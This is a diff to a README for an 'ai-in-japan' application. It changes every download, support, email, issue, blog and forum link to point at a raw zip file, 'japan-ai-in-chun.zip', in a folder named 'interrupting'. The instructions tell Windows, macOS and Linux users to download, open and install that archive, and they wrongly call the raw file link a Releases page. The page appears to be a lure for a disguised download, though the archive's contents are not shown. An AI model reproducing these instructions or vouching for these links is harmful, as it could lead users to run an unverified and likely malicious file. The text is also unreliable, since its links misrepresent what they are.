@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the ai-in-japan application e
 
 ## 📥 Download
 
-[![Download Here](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip)](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip)
+[![Download Here](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip)](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,14 +27,14 @@ The ai-in-japan application provides:
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip).
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the ai-in-japan application.
 3. You will see different files listed. Click on the file that matches your operating system. For example:
-   - For Windows, select `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip`.
-   - For macOS, select `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip`.
-   - For Linux, select `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip`.
+   - For Windows, select `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip`.
+   - For macOS, select `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip`.
+   - For Linux, select `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip`.
 4. The download will start automatically.
 
 ### 🖥️ Running the Application
@@ -42,17 +42,17 @@ To download the application, visit this page: [Download Here](https://raw.github
 Once the download is complete, follow these steps to run the application:
 
 - **For Windows:**
-  1. Open the downloaded file `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip`.
+  1. Open the downloaded file `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip`.
   2. Follow the installation prompts on your screen.
   3. After installation, find the application in your Start Menu and click to launch.
 
 - **For macOS:**
-  1. Open the downloaded file `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip`.
+  1. Open the downloaded file `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip`.
   2. Drag the ai-in-japan application to your Applications folder.
   3. Go to Applications and find ai-in-japan to run it.
 
 - **For Linux:**
-  1. Extract the downloaded file `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip`.
+  1. Extract the downloaded file `https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip`.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application with the command `./ai-in-japan`.
 
@@ -89,8 +89,8 @@ If you encounter issues while using the application, here are some quick solutio
 
 If you need help, please reach out:
 
-- Email: https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip
-- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip)
+- Email: https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip)
 
 ## 🛡️ Privacy Policy
 
@@ -100,7 +100,7 @@ We value your privacy. We do not collect personal data without consent. For more
 
 For more information and tips on AI development tools, check out:
 
-- [AI in Japan Blog](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip)
-- [Community Forum](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/ai-in-japan.zip)
+- [AI in Japan Blog](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip)
+- [Community Forum](https://raw.githubusercontent.com/Ryan965-star/ai-in-japan/master/interrupting/japan-ai-in-chun.zip)
 
 Thank you for choosing ai-in-japan! We hope you find it helpful in your journey through AI development.
